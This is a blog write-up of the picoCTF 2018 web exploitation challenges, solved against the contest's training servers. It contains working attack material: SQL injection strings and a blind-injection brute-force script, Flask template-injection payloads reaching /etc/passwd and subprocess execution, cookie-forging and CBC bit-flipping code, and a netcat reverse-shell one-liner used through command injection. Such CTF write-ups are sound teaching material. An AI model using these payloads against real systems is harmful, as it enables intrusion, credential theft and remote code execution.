---
layout: post
title: PicoCTF 2018 - Web Exploitation
---

This post will be focusing on the "Web Exploitation" challenges presented in picoCTF. Im not the expert on web exploitation, and really enjoy when things just work out, which happened here, and all of the challenges were solved except one.
All the resources for these challenges, including most of the files, you can find in [my repository](https://github.com/bear-sec/pico2018 "picoCTF2018 writeups").

# Inspect Me

Inpect this code! http://2018shell1.picoctf.com:28831 (link)

<details>
  <summary>Hints</summary>
  
    1. How do you inspect a website's code on a browser? <br>
    2. Check all the website code.
</details>

## Solution

Inspecting the page source we get the first part of the flag, and a hint that there are two more parts. 

![source](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-inspector_1.PNG)

We inspect the only two included files with this site, which are the CSS and JS files, and see the rest of the flag.

![csource](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-inspector_2.PNG)

----

# Client Side is Still Bad

I forgot my password again, but this time there doesn't seem to be a reset, can you help me? http://2018shell1.picoctf.com:55790 (link)

<details>
  <summary>Hints</summary>
  
    1. Client Side really is a bad way to do it.
</details>

## Solution

We inspect the login button and see that it verifies with a function on the client side.

![verify](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-client_1.PNG) 

The finction splits the inputted password and checks 4 bytes at a time that it equals some hardcoded string. The string is the flag.

----

# Logon

I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. http://2018shell1.picoctf.com:57252 (link)

<details>
  <summary>Hints</summary>
  
    1. Hmm it doesn't seem to check anyone's password, except for admins?
    2. How does check the admin's password?
</details>

## Solution

In this challenge were presented with a login page that we need to pass as an admin.
We are suggested that it passes any regular user login without any password check, so we try and login with a regular user. We can see that after we request the /login page, theres another request to /flag page, and to this page we see that our browser sends some values in the cookie.

![false](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-logon_1.PNG)

since we control the cookie we can change the admin value to True and try again. So we stop the outgoing requests and modify admin=True, 

![true](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-logon_3.PNG)

and voila, we got the flag!

![flag](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-logon_4.PNG)

----

# Irish Name Repo

There is a website running at http://2018shell1.picoctf.com:11899 (link). Do you think you can log us in? Try to see if you can login!

<details>
  <summary>Hints</summary>
  
    1. There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?
</details>

## Solution

we see at this page some familiar faces but we need to login as admin. so we go to the admin login panel and try the first value that comes to mind, admin:admin.

![1](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-irish_1.PNG)

The login fails, so we try and check for sqli, maybe it handles it poorly andwe can get an error, so we put in a single bracket, and we get a 500!

![3](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-irish_3.PNG)

cool, now lets try a basic sqli that bypasses the password check.
In this sqli we assume that the query that the backend performs is as follows:

`'SELECT * FROM users WHERE user_name=' . user_name . ' AND password=' .pasword`

so what we can do is set the password to `a' OR '1'='1`
and the resulting query will be:

`'SELECT * FROM users WHERE user_name='admin' AND password='a' OR '1'='1'`

and what it does is retrieves the user where user_name=admin, and a TRUE statement, the password fails, but the '1'='1' succeeds so the query outputs the relevant data and we get the flag.

![4](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-irish_4.PNG)

----

# Mr Robots

Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell1.picoctf.com:29568 (link)

<details>
  <summary>Hints</summary>
  
    1. What part of the website could tell you where the creator doesn't want you to look?
</details>

## Solution

The name kinda reveals what we need to do here, but we get a link to an empty page, and the hint says, what part could tell that me where the creator doesnt want me to look, and of course its the robots.txt file. we check it and see another html

![tiextie](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-robots_1.PNG)

and the flag is in that page.

![lol](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-robots_2.PNG)

----

# No Login

Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. http://2018shell1.picoctf.com:10573 (link)

<details>
  <summary>Hints</summary>
  
    1. What is it actually looking for in the cookie?
</details>

## Solution

We get another login screen that has a flag button that supposedly will give the flag only if the one pressing it is and admin.

![2](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-nologin_2.PNG)
![3](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-nologin_3.PNG)

The hint says it has to do with the cookie, so lets check the site and see what we can do. We see that when you press the button it sends a request to /flag, and returns a jwt cookie saying were not admin, so lets try adding that we indeed are.

![5](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-nologin_5.PNG)

And it worked, we got the flag.

![1](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-nologin_1.PNG)

----

# Secret Agent

Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. http://2018shell1.picoctf.com:53383 (link)

<details>
  <summary>Hints</summary>
  
    1. How can your browser pretend to be something else?
</details>

## Solution

So we get the same page with the flag button as previous challenge and upon pressing the button we get an error message that were not google.

![notgoogle](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-agent_1.PNG)

Lets try and tell it that we are by changing the user-agent to "google"

![googlegoogle](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-agent_2.PNG)

As it turns out, google is not google, so lets try and see what user agent the google web crawler uses.

![bots](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-agent_3.PNG)

It seems hes quite fond of the bot, so we got the flag.

![flag](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-agent_4.PNG)

----

# Buttons

There is a website running at http://2018shell1.picoctf.com:7949 (link). Try to see if you can push their buttons.

<details>
  <summary>Hints</summary>
  
    1. What's different about the two buttons?
</details>

## Solution

This challenge we get a page with a button that refers us to the second button and upon pressing it we get rick rolled.

![byuton](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-buttons_4.PNG)

The hist says that we need to check whats the difference between the two, and the first one is submitted as a form via POST, and the secont one is just a href link, which will be addressed to with a GET request.

![button1](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-buttons_3.PNG)
![button2](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-buttons_2.PNG)

so we break on the button2.php request and change it from GET to POST, and get the flag.

![fleg](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-buttons_1.PNG)

----

# The Vault

There is a website running at http://2018shell1.picoctf.com:49030 (link). Try to see if you can login!

No hints for this one.

## Solution

We get yet another login anel that we need to pass. This time we also get the source code of the backend application.

```php
<?php
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  include "config.php";
  $con = new SQLite3($database_file);

  $username = $_POST["username"];
  $password = $_POST["password"];
  $debug = $_POST["debug"];
  $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";

  if (intval($debug)) {
    echo "<pre>";
    echo "username: ", htmlspecialchars($username), "\n";
    echo "password: ", htmlspecialchars($password), "\n";
    echo "SQL query: ", htmlspecialchars($query), "\n";
    echo "</pre>";
  }

  //validation check
  $pattern ="/.*['\"].*OR.*/i";
  $user_match = preg_match($pattern, $username);
  $password_match = preg_match($pattern, $username);
  if($user_match + $password_match > 0)  {
    echo "<h1>SQLi detected.</h1>";
  }
  else {
    $result = $con->query($query);
    $row = $result->fetchArray();
    
    if ($row) {
      echo "<h1>Logged in!</h1>";
      echo "<p>Your flag is: $FLAG</p>";
    } else {
      echo "<h1>Login failed.</h1>";
    }
  }
  
?>
```

we see that theres a regular expression pattern check that validates that we dont input ' OR '1'='1., and we need to think of some query that wont match this.

![login](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-vault_2.PNG)

we try to login with the admin user, terminate the query, and mark the rest as comment, without the password check. supplying this string:
admin'; --
thus the resulting query will be:
"SELECT 1 FROM users WHERE name='admin'; -- AND password='bloop'";
this will cause the query to just check the username and the rest of it will be a comment.

![flaag](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-vault_1.PNG)

----

# Artisinal Handcrafted HTTP 3

We found a hidden flag server hiding behind a proxy, but the proxy has some... _interesting_ ideas of what qualifies someone to make HTTP requests. Looks like you'll have to do this one by hand. Try connecting via nc 2018shell1.picoctf.com 26431, and use the proxy to send HTTP requests to `flag.local`. We've also recovered a username and a password for you to use on the login page: `realbusinessuser`/`potoooooooo`.

<details>
  <summary>Hints</summary>
  
    1. _Be the browser._ When you navigate to a page, how does your browser send HTTP requests? How does this change when you submit a form?
</details>

## Solution

So were presented with a socket to connect to, and as we do were greeted with a simple math problem and answering it correctly, gives us an instruction to commence HTTP. We issue a GET request for the host supplied in the challenge

```
GET /login HTTP/1.1
Host: flag.local
```

and get an html page saying we neet to login 1st, and a link to the login page.

![image1](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-artisinal_1.PNG)

we GET the login page to see how we can login, and see that we need to do a POST to this page with a `user` and a `pass`. 

![image2](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-artisinal_2.PNG)

In the challenge we already have a username and pass to login with, so we try them, this time though since were sending data, we needto tell it how much data were sending, and whats the data type, so we find whats the contect type for [post forms](https://stackoverflow.com/questions/4007969/application-x-www-form-urlencoded-or-multipart-form-data) and wee that we neet `application/x-www-form-urlencoded` since were sending it at once.

![try_them](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-artisinal_3.PNG)

```
POST /login HTTP/1.1
Host: flag.local
Content-Length: 38
Content-Type: application/x-www-form-urlencoded

user=realbusinessuser&pass=potoooooooo
```


we get a cookie to set, and a redirect to the / main page again, where we were asked to be logged in, so we issue another request, this time supplying a cookie

```
GET / HTTP/1.1
Host: flag.local
Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
```

and we get the flag!

![cookie](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-artisinal_4.PNG)

----

# Flaskcards

We found [this fishy website](http://2018shell1.picoctf.com:51878/) for flashcards that we think may be sending secrets. Could you take a look?

<details>
  <summary>Hints</summary>
  
    1. Are there any common vulnerabilities with the backend of the website?<br>
    2. Is there anywhere that filtering doesn't get applied?<br>
    3. The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user
</details>

## Solution

In this challenge we get a link to a web app that you can log into and leave cards, and read them. First thing is to try find out whats the backend of that application to try and find vulnerabilities that are relevant to this app. the name of the challenge gives it away, i know that we have SSTI with flask, we can check where there isnt any input validation. 
we will try and create a user with a template in its username. with no luck. 
Lets try and craete a card with some expression to evaluate, like 1+2, so we put in the name `{{ 1+2 }}`

![atwo](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-flaskca_1.PNG)

and bam, we get a 3.

![athree](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-flaskca_2.PNG)

now lets get something interesting like the config: `{{ config }}`

![config](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-flaskca_3.PNG)

and heres the flag.

----

# Fancy-Alive-Monitoring

One of my school mate developed an alive monitoring tool. Can you get a flag from http://2018shell1.picoctf.com:8587 (link)?

<details>
  <summary>Hints</summary>
  
    1. This application uses the validation check both on the client side and on the server side, but the server check seems to be inappropriate.<br>
    2. You should be able to listen through the shell on the server.
</details>

## Solution

In this challenge we get the source code of the page:

```php
<html>
<head>
	<title>Monitoring Tool</title>
	<script>
	function check(){
		ip = document.getElementById("ip").value;
		chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
		if (!chk) {
			alert("Wrong IP format.");
			return false;
		} else {
			document.getElementById("monitor").submit();
		}
	}
	</script>
</head>
<body>
	<h1>Monitoring Tool ver 0.1</h1>
	<form id="monitor" action="index.php" method="post" onsubmit="return false;">
	<p> Input IP address of the target host
	<input id="ip" name="ip" type="text">
	</p>
	<input type="button" value="Go!" onclick="check()">
	</form>
	<hr>

<?php
$ip = $_POST["ip"];
if ($ip) {
	// super fancy regex check!
	if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) {
		exec('ping -c 1 '.$ip, $cmd_result);
		foreach($cmd_result as $str){
			if (strpos($str, '100% packet loss') !== false){
				printf("<h3>Target is NOT alive.</h3>");
				break;
			} else if (strpos($str, ', 0% packet loss') !== false){
				printf("<h3>Target is alive.</h3>");
				break;
			}
		}
	} else {
		echo "Wrong IP Format.";
	}
}
?>
<hr>
<a href="index.txt">index.php source code</a>
</body>
</html>
```

We supply an address, and the backend application checks if it can connect to it with a ping, and returns the output to the user, os right away the target is a command injection.
theres a good client side validation on the IP that we supply, but its client side, so we need redefine the check function to just return true.

![yes](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-fancy_2.JPG)

We see that the server side check of the IP doesnt have the $, that indicates that after the last octat of the IP it supposed to terminate, so we can add anything we want after the IP. 
We add an && that executes what comes after the ping. 

Now we need to think of a apayload to send it after the &&, and first think that comes in mind is a reverse shell which is achieved in a couple of ways, theres a great github with a cheat sheet with lots of reverse/forward shells and whatnot so we see that theres one that is independent of what the server has installed, and its using files and pipes.
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 2018shell1.picoctf.com 1337 >/tmp/f`
we need to supply it an address to connect to, since we dont have a public IP address, we make it connect to the pico ctf shell. 
and we have a connection!

![shell](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-fancy_1.JPG)

----

# Secure Logon

Uh oh, the login page is more secure... I think. http://2018shell1.picoctf.com:12004 (link). [Source](https://github.com/bear-sec/pico2018/raw/master/Web%20Exploitation/13%20-%20Secure%20logon/server_noflag.py).

<details>
  <summary>Hints</summary>
  
    1. There are versions of AES that really aren't secure.
</details>

## Solution

from [the source code provided](https://github.com/bear-sec/pico2018/raw/master/Web%20Exploitation/13%20-%20Secure%20logon/server_noflag.py) we can see that the cookie is encrypted with cbc, and we know the cleartext that was encrypted, so we can change the cookie with [bit flipping attack](https://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#gref)
we send the request to login with an arbitrary username and password to get the cookie, modify it with our code. Now that we have the modified cookie, we can set it to our browser using the set-cookie on the response.
now we browse to /flag on the website and get the flag.

the code i used for the bitflipping:

```python
.
.
.
same as source
.
.
.

#enc , payload = login('adm', 'p')
# our cookie with the admin: 0
enc ='0uTxbDTBhdqh+r7bJv1ggFKU2azwsUpI/VjMLvPxAXRTs/IHaLpzz10MHOHlC2LJiNp5zxIo1sHbnIebV+n7Hev8sVUtd2nfufcOLGvE+Go='
print("enc = "+ enc)
enc = base64.b64decode(enc)
#print("cook = "+payload)
#print("Bef  = "+enc)
cipher_list = []
#payload ="{'username': 'adm', 'admin': 1, 'password': 'p'}"
ciphertext = enc

i = 0
while i*16 <= len(ciphertext):
    cipher_list.append(ciphertext[i*16: 16 + (i*16)])
    i += 1
cipher_list.remove(cipher_list[5])
y=10

attack_on_block = cipher_list[0]
list1 = list(attack_on_block)
list1[y] = chr(ord(list1[y]) ^ ord("0") ^ ord("1"))
cipher_list[0] = ''.join(list1)
ciphertext = ''.join(cipher_list)
rep = base64.b64encode(ciphertext)
print("rep = " +rep)
# not we use whats printed out and set it as the new cookie.
```

----

# Flaskcards Skeleton Key

Nice! You found out they were sending the Secret_key: a155eb4e1743baef085ff6ecfed943f2. Now, can you find a way to log in as admin? http://2018shell1.picoctf.com:53588 (link).

<details>
  <summary>Hints</summary>
  
    1. What can you do with a flask Secret_Key?<br>
    2. The database still reverts every 2 hours
</details>

## Solution

using the secret_key variable in a flask application we can encode and decode valid cookies. we will write some code to encode and decode cookies, and change ours to admin:1

```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

def decode_flask_cookie(secret_key, cookie_str):
    
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)
```

Using this code we can generate our own cookie and decode any cookie that we know the secret_key for.

![decode](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-skeleton_1.PNG)

so we encode out cookie with userid 1

![encode](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-skeleton_2.PNG)

and profit

![profit](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-skeleton_3.PNG)

----

# Help Me Reset 2

There is a website running at http://2018shell1.picoctf.com:26133 (link). We need to get into any user for a flag!

<details>
  <summary>Hints</summary>
  
    1. Try looking past the typical vulnerabilities. Think about possible programming mistakes.
</details>

## Solution

we are presented with an application that does nothing, but has a login option. in the source we can see some comments with different usernames each time that we can use later.

![comment](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-reset_1.PNG)

in the log in screen we see that you can choose that you forgot your password, se lets try to reset the admin password. 

![doenst exist](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-reset_2.PNG)

no success, user does not exist, well lets try the users we found in the comments

![exists](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-reset_3.PNG)

were presented with what seems to be random questions. the vulnerability i found is that there is no global counting of failed questions and the answers for the questions are pretty easy to guess, like carmake, hero, and color. so we can constantly retry the same question until we find the answer. 
after we succeed with one of the questions, since they are random we can get the same question after we just answered it.
and since we know the answer already we can just reset the password.

![profit](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/web-reset_5.PNG)

Later on ive found that the answer to the questions werent supposed to be bruteforced, and they were in the session cookie
![ebin](https://github.com/bear-sec/bear-sec.github.io/raw/master/images/picard-facepalm.jpg)

----

# Help Me Reset 2

There is a website running at http://2018shell1.picoctf.com:32635 (link). Try to see if you can answer its question.

No hints for this one.

## Solution

in this challenge we get a prompt that preforms an SQL query, and we need to know whats the answer. 
Assuming the SQL query performed is:
`SELECT * from answers WHERE answer=' . input . ';'`
can check each of the answers letters with the following query
`SELECT * from answers WHERE answer='a' OR substr(answer,LETTER_INDEX,1)=GUESSED_LETTER`
and if the guess is correct we will get a true query, and if not, false.

lets write some code that bruteforces the answer. 
```python
import requests
import string

headers = {"Origin": "http://2018shell1.picoctf.com:32635",
           "Content-Type": "application/x-www-form-urlencoded",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
           "Referer": "http://2018shell1.picoctf.com:32635/",
           "Cookie": "_ga=GA1.2.462784079.1538506491; _gid=GA1.2.1401433204.1538506491; remember_token=4|3ac124667f29fa5852224e6c46c961748aaccdc7265b1e29472615991e6e387490b5825c530894814407474c8fc3b6c85a36d51935391df2a65f985f4428026b; session=.eJwlj0FqAzEMAP_icw6SLcnafGaRLImGQAu7yan071noA2aY-W17HXl-tfvreOet7Y9o91aoOGHSsLX1TWukYAeBXOzTPVg72AYbI3P0DjWMo0xCwGcJkqwVwgNlTIq1aAUSz6WzzHkOUleeyhoQMirCoHoo8rBwMWq3ts6j9tfPM7-vHrPePcs3NkZMvIyGlEhqI7sABlB4x4t7n3n8T1D7-wBOtD6-.Dpc1sQ.NnG0QH-tXF6KfcHs3bHL37-yRPU"
           }
data = "answer=a%27+or+substr%28answer%2C{}%2C1%29%3D%27{}&debug=1"
url = "http://2018shell1.picoctf.com:32635/answer2.php"
go = 1
counter = 1
answer = ''

while go:
    print 'The string is: ', answer
    for i in string.printable:
        req = requests.post(url, data=data.format(counter,i), headers=headers)
        if req.content.find('Wrong') == -1:
            print 'success at: ',i
            answer += i
            break
    if req.content.find('close') == -1:
        print 'Finished: picoCTF%s' % answer
    counter+=1
```

running this gives the answer

----

# LambDash 3

C? Who uses that anymore. If we really want to be secure, we should all start learning lambda calculus. http://2018shell1.picoctf.com:52603 (link).

<details>
  <summary>Hints</summary>
  
    1. This compiler is 99.9% bug free! I'm sure the other 0.1% won't amount to anything...
</details>

## Solution

I havent solved this one :(

----

# LambDash 3

There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell1.picoctf.com:5010 (link)

<details>
  <summary>Hints</summary>
  
    1. There's more to the original vulnerability than meets the eye.<br>
    2. Can you leverage the injection technique to get remote code execution?<br>
    3. Sorry, but the database still reverts every 2 hours.
</details>

## Solution

in this challenge again we are directed towards the SSTI in flask again. 
Since this is a 900 points challenge i recon we will break a sweat.
in this [great github](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections)
we can find a payload that uses jinja2, just putting this payload doent work, so we need to research a bit about what it is.
First of all since we know jinja2 is Python based, and we know python, we recognize the parts of the payload, so lets try and break it down:

''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()

so running this in python, without the ('/etc/passwd').read(), gives us the following:

So why on earth doesnt the payload work. Well one thing we can see here is that we have hardcoded offsets into the presumably arrays, like __mro__[2], and __subclasses__[40], maybe we need to just adjust it so it will work here. 
So fist thing to do is check if the simplest payload works again, and go from there.
(should be noted, dont know if its my browser but adding cards breaks the payload, so i needed to delete the last one each time)
''.__class__
Great! it works, lets go from here, we need the baseclasses of our 'str' class and choose one that has some interesting subclasses.
next is ''.__class__.__mro__
Cool, we see that there are 2 classes, 'str' and 'object', so thats failure point #1 that we found for the prepared payload, it didnt have a third object in the list so [2] wont work. 
Now lets see what interesting subclasses of 'object' we can use. we will list them using:
''.__class__.__mro__[1].__subclasses__()
Woah, thats a lot of data, lets find a way to parse it, lets replace in npp < to '< and > to >' so that it will be an array of strings that we can work with in python.
Ok, lets try and find some interesting class that we can use, like subprocess. 
Nice, we have subprocess.Popen, so we can call a process and see its output. lets try and run a command like 'id'.
Lets try and call a command in our python shell with Popen, and catch the output with a oneliner. What we need to pass to Popen to call a command and catch the output? well, the command, (in my case ill try and run whoami cause im on a windows machine) and that we need to pipe the output to python. so we need to set stdout to subprocess.PIPE, but we dont have subprocess class, we have Popen, but PIPE is a const that is equals to -1. ok, lets continue crafting the payload.
Ok so after we checked that the payload works on my windows machine, lets change it and run on the vulnerable machine.
DAMN! nothing beats the feeling of RCE that works.
ok, lets keep the eyes on the prize, we need to find the flag, presumably a file? lets ls current dir.
and heres the flag, so lets just cat the file, remember that to add arguments we need to change the argument from just a string to a list i.e. ['cat', 'flag']

----
